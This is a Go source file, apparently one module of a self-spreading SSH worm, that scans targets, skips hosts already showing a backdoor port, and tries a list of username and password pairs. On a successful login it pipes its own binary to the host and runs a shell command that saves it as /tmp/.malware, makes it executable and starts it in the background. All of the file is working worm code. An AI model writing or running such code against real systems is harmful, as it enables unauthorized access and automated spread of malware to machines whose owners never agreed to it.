package main

/*
 * attack.go
 * The actual bad bit
 * By J. Stuart McMurray
 * Created 20160808
 * Last Modified 20160808
 */

import (
	"bytes"
	"fmt"
	"log"
	"net"
	"time"

	"golang.org/x/crypto/ssh"
)

/* Attacker reads targets from ach, and attacks them. */
func Attacker(ach <-chan string) {
	for t := range ach {
		attack(t)
	}
}

/* attack attacks a single target */
func attack(t string) {
	/* Make sure it's not listening on the backdoor port */
	if t, err := net.Dial(
		"tcp",
		net.JoinHostPort(t, fmt.Sprintf("%v", CONFIG.BDPort)),
	); nil == err {
		t.Close()
		return
	}
	/* Try each set of creds */
	for _, cred := range CONFIG.Creds {
		/* Try to connect to the target */
		c, err := ssh.Dial(
			"tcp",
			net.JoinHostPort(t, "ssh"),
			genConfig(cred.Username, cred.Password),
		)
		/* If it's a network error, don't keep trying */
		if _, ok := err.(*net.OpError); ok {
			break
		}
		/* TODO: Handle more types of errors (i.e. give up on connection refused, such) */
		/* If it worked, we're in business */
		if nil == err {
			/* TODO: Call back to somewhere with successful creds */
			go func() {
				if err := spread(c); nil != err {
					log.Printf(
						"Failed to spread to %v: %v",
						t,
						err,
					)
					return
				}
				log.Printf("Spread to %v", t)
			}()
			return
		}
	}
	return
}

/* genConfig returns a config which will try to authenticate with the given
user / pass pair */
func genConfig(user, pass string) *ssh.ClientConfig {
	return &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{
			ssh.Password(pass),
			ssh.KeyboardInteractive(
				func(string, string, []string, []bool) (
					answers []string, err error,
				) {
					return []string{pass}, nil
				},
			),
		},
		ClientVersion: CONFIG.Version,
		Timeout:       3 * time.Second,
	}
}

/* spread does the real damage */
func spread(c *ssh.Client) error {
	defer c.Close()
	/* Request a new session */
	s, err := c.NewSession()
	if nil != err {
		return nil
	}
	/* Copy the program to upload */
	p := make([]byte, len(BINARY))
	copy(p, BINARY)
	/* Hook it up to stdin */
	s.Stdin = bytes.NewBuffer(p)
	/* Run it! */
	return s.Run(
		"/bin/sh -c '" +
			"cat >/tmp/.malware && " +
			"chmod 0500 /tmp/.malware && " +
			"nohup /tmp/.malware " +
			">>/tmp/.malware.out " +
			"2>>/tmp/.malware.err &" +
			"'",
	)
}
